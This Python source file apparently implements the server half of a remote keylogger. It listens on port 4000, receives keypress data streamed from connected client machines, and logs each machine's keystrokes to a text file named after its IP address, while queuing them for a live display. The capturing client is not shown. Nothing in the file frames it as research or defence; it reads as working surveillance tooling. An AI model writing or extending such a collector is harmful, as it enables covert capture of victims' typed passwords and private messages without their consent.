import socket
import threading
import queue
import time

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

clients = []
client_sockets = {}
keypress_queues = {}

# Function to handle keypress data.
def handle_keypress(client_socket, keypress_queue):
    client_address = client_socket.getpeername()[0]
    file_name = f"{client_address}.txt"
    newline_added = False  # Flag to track if a newline has been added
    last_keypress_time = time.time()  # Track the time of the last keypress

    with open(file_name, 'a') as file:
        while True:
            try:
                # Check if 5 seconds have passed since the last keypress
                if time.time() - last_keypress_time >= 5:
                    if not newline_added:
                        keypress_queue.put('\n')
                        file.write('\n')
                        newline_added = True

                keypress = client_socket.recv(BUFFER_SIZE).decode()
                if not keypress:
                    continue

                keypress_queue.put(keypress)
                file.write(keypress)
                newline_added = False  # Reset the flag when something is written
                last_keypress_time = time.time()  # Update the last keypress time
            except Exception as e:
                print(f"Error: {e}")
                break
    client_socket.close()

# Function to start the server and wait for a connection.
def start_server(update_clients_list):
    global s
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")

    

    while True:
        client_socket, client_address = s.accept()
        clients.append(client_address)
        client_sockets[client_address] = client_socket
        keypress_queue = queue.Queue()
        keypress_queues[client_address] = keypress_queue
        update_clients_list(clients)
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        threading.Thread(target=handle_keypress, args=(client_socket, keypress_queue)).start()

# Function to stop the server.
def stop_server():
    try:
        for client in clients:
            client_sockets[client].close()
        s.close()
    except:
        pass

